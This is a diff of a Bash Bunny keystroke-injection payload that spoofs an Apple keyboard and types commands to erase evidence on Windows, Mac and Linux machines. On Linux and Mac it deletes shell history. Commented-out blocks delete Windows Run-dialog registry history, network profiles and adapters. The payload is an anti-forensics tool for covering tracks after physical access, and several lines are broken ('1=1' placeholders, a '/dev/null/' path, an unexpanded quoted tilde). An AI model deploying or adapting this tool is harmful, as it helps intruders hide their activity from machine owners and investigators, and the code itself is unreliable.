@@ -8,14 +8,37 @@
 #
 # Cleans the input history on Windows, Mac and Linux
 #
+
+
+
 #+++ CONFIG +++
 
 LINES=0 # EXACT NUMBER OF LINES TO REMOVE FROM HISTORY (MAC / LINUX) - DEFAULT : 0 = ALL
 OS="UNITY" # OPTIONS: "UNITY", "MAC", OR "WINDOWS"
+UNMOUNT=false
+
+DEBUG=true
 
 #+++ END CONFIG +++
 
-LED R
+
+
+# GHOST CLEANUP
+#
+
+# DEBUG
+DEBUG_FILE="/dev/null/"
+if [ "${DEBUG}" = "true" ]; then
+    DEBUG_FILE="/root/udisk/loot/ghost_cleanup/debug.txt"
+    if [ ! -d "/root/udisk/loot/ghost_cleanup" ]; then
+      mkdir /root/udisk/loot
+      mkdir /root/udisk/loot/ghost_cleanup
+    fi
+    touch "${DEBUG_FILE}"
+    echo "DEBUG STARTED" >> "${DEBUG_FILE}"
+fi
+# END DEBUG
+
 
 # PLATFORM CHECK
 # FOR DYNAMIC SWITCHING, CREATE FILE '/root/udisk/loot/ghost_cleanup/os_windows' IN YOUR FIRST PAYLOAD.
@@ -28,67 +51,107 @@ fi
 if [ -f "/root/udisk/loot/ghost_cleanup/os_unity" ]; then
     OS="UNITY"
 fi
+echo "${OS}" >> "${DEBUG_FILE}"
+# END PLATFORM CHECK
 
-# START CLEANUP
-ATTACKMODE HID VID_0X05AC PID_0X021E
 
-QUACK DELAY 500
-if [ "$OS"=="UNITY" ]; then
-    LED R B
-    QUACK ALT F2
-fi
-if [ "$OS"=="MAC" ]; then
-    LED R B G
-    QUACK GUI SPACE
-fi
-if [ "$OS"=="WINDOWS" ]; then
-    LED B
-    QUACK GUI r
-fi
-QUACK DELAY 50
-QUACK BACKSPACE
-QUACK DELAY 100
+# INIT FUNCTIONS
+clear_active_input()
+{
+    QUACK DELAY 50
+    QUACK BACKSPACE
+    QUACK DELAY 100
+}
 
-if [ "$OS"=="UNITY" ] || [ "$OS"=="MAC" ]; then
-    QUACK STRING terminal
+enter_and_wait()
+{
+    if [ -z "$1" ]; then
+        WAIT_DELAY=1000
+    else
+        WAIT_DELAY=$1
+    fi
     QUACK DELAY 200
     QUACK ENTER
-    QUACK DELAY 1000
-    #++ INSERT CUSTOM MAC / LINUX CLEANUP GOODNESS ++
+    QUACK DELAY ${WAIT_DELAY}
+}
 
-    if [ "$OS"=="MAC" ]; then
-        LED R B G 100
-        QUACK STRING diskutil unmount /Volumes/BashBunny
-        QUACK DELAY 200
-        LED R B G 100
-    else
-        LED R B 100
-    fi
-
+clear_history_from_terminal()
+{
     if [ "$LINES" -gt "0" ]; then
         QUACK STRING head -n -$LINES "~/.bash_history"
         QUACK ENTER
+        QUACK DELAY 100
         QUACK STRING history -c
         QUACK ENTER
+        QUACK DELAY 100
     else
         QUACK STRING rm "~/.bash_history"
         QUACK ENTER
+        QUACK DELAY 1000
         QUACK STRING history -c
         QUACK ENTER
     fi
-else #WINDOWS
-    QUACK STRING powershell
-    QUACK DELAY 200
-    QUACK ENTER
-    QUACK DELAY 1000
+    echo "HISTORY CLEARED FROM TERMINAL" >> "${DEBUG_FILE}"
+}
 
-    LED B 100
-    # QUACK @echo off
-    # QUACK ENTER
-    #++ INSERT CUSTOM WINDOWS CLEANUP GOODNESS ++
+clear_history_from_powershell()
+{
+    if [ "$LINES" -gt "0" ]; then
+#        QUACK STRING setlocal enableextensions enabledelayedexpansion
+#        QUACK ENTER
+#        QUACK DELAY 200
+#        QUACK STRING set len="${LINES}"
+#        QUACK ENTER
+#        QUACK DELAY 200
+#        QUACK STRING set /a len_pos=%len%-1
+#        QUACK ENTER
+#        QUACK DELAY 200
+#        QUACK STRING for /f "tokens=2*" %%a in ('reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /v MRUList') do set "mru=%%b"
+#        QUACK ENTER
+#        QUACK DELAY 200
+#        QUACK STRING for /f %%c in ('cmd /u /v /q /c"(echo(!mru!)" ^| find /v "" ^| findstr /r /c:"[a-z]" ^| find /c /v ""') do set "str_len=%%c"
+#        QUACK ENTER
+#        QUACK DELAY 200
+#        # Get the last Nr of defined lines from MRUList
+#        QUACK STRING set list=!mru:~0,%len%!
+#        QUACK ENTER
+#        QUACK DELAY 200
+#        # Set the new MRUList
+#        QUACK STRING set original_list=!mru:~%len%,%str_len%!
+#        QUACK ENTER
+#        QUACK DELAY 200
+#        # Delete old MRUList
+#        QUACK STRING reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" /v MRUList /f
+#        QUACK ENTER
+#        QUACK DELAY 200
+#        # Add new MRUList
+#        QUACK STRING reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" /v MRUList /t Reg_Sz /d %original_list%
+#        QUACK ENTER
+#        QUACK DELAY 200
+#        # Delete the last Nr of lines from Registry
+#        QUACK STRING for /l %%d in (0,1,%len_pos%) do (reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" /v !list:~%%d,1! /f)
+#        QUACK ENTER
+#        QUACK DELAY 200
+        1=1
+    else
+        0=0
+#        QUACK STRING reg delete "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" /va /f
+#        QUACK ENTER
+#        QUACK DELAY 200
+    fi
+    echo "HISTORY CLEARED FROM POWERSHELL" >> "${DEBUG_FILE}"
+}
 
+unmount_drive_from_mac()
+{
+    # QUACK STRING diskutil unmount /Volumes/BashBunny
+    # if lines > 0; lines + 1
+    1=1
+}
 
-    # REMOVE ALL ETHERNET ADAPTERS
+remove_windows_network_adapters()
+{
+    1=1
     # QUACK STRING reg delete HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\NetworkList\Profiles /va /f
     # QUACK ENTER
     # QUACK DELAY 100
@@ -102,48 +165,67 @@ else #WINDOWS
     # QUACK STRING netsh delete profile interface= $ADAPTER
     # QUACK ENTER
     # QUACK DELAY 100
+}
 
-    if [ "$LINES" -gt "0" ]; then
-        QUACK STRING setlocal enableextensions enabledelayedexpansion
-        QUACK ENTER
-        QUACK DELAY 200
-        QUACK STRING set len="${LINES}"
-        QUACK ENTER
-        QUACK DELAY 200
-        QUACK STRING set /a len_pos=%len%-1
-        QUACK ENTER
-        QUACK DELAY 200
-        QUACK STRING for /f "tokens=2*" %%a in ('reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /v MRUList') do set "mru=%%b"
-        QUACK ENTER
-        QUACK DELAY 200
-        QUACK STRING for /f %%c in ('cmd /u /v /q /c"(echo(!mru!)" ^| find /v "" ^| findstr /r /c:"[a-z]" ^| find /c /v ""') do set "str_len=%%c"
-        QUACK ENTER
-        QUACK DELAY 200
-        # Get the last Nr of defined lines from MRUList
-        QUACK STRING set list=!mru:~0,%len%!
-        QUACK ENTER
-        QUACK DELAY 200
-        # Set the new MRUList
-        QUACK STRING set original_list=!mru:~%len%,%str_len%!
-        QUACK ENTER
-        QUACK DELAY 200
-        # Delete old MRUList
-        QUACK STRING reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" /v MRUList /f
-        QUACK ENTER
-        QUACK DELAY 200
-        # Add new MRUList
-        QUACK STRING reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" /v MRUList /t Reg_Sz /d %original_list%
-        QUACK ENTER
-        QUACK DELAY 200
-        # Delete the last Nr of lines from Registry
-        QUACK STRING for /l %%d in (0,1,%len_pos%) do (reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" /v !list:~%%d,1! /f)
-        QUACK ENTER
-        QUACK DELAY 200
-    else
-        QUACK STRING reg delete "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" /va /f
-        QUACK ENTER
-        QUACK DELAY 200
-    fi
+echo "FUNCTIONS LOADED" >> "${DEBUG_FILE}"
+# END FUNCTIONS
+
+
+# START CLEANUP
+LED R
+
+ATTACKMODE HID VID_0X05AC PID_0X021E
+
+QUACK DELAY 500
+
+#UNITY
+if [ "${OS}" = "UNITY" ]; then
+    LED R B 100
+    QUACK ALT F2
+    clear_active_input
+    QUACK STRING terminal
+    enter_and_wait
+
+    #++ INSERT CUSTOM UNITY CLEANUP HERE ++
+
+
+    #++ END CUSTOM UNITY CLEANUP
+
+    clear_history_from_terminal
+fi
+
+
+#MAC
+if [ "${OS}" = "MAC" ]; then
+    LED R B G 100
+    QUACK GUI SPACE
+    clear_active_input
+    QUACK STRING terminal
+    enter_and_wait
+
+    #++ INSERT CUSTOM MAC CLEANUP HERE ++
+
+
+    #++ END CUSTOM MAC CLEANUP
+    unmount_drive_from_mac
+    clear_history_from_terminal
+fi
+
+
+#Windows
+if [ "${OS}" = "WINDOWS" ]; then
+    LED B 100
+    QUACK GUI r
+    clear_active_input
+    QUACK STRING powershell
+    enter_and_wait
+
+    #++ INSERT CUSTOM WINDOWS CLEANUP HERE ++
+
+
+    #++ END CUSTOM WINDOWS CLEANUP
+
+    clear_history_from_powershell
 fi
 
 QUACK DELAY 100
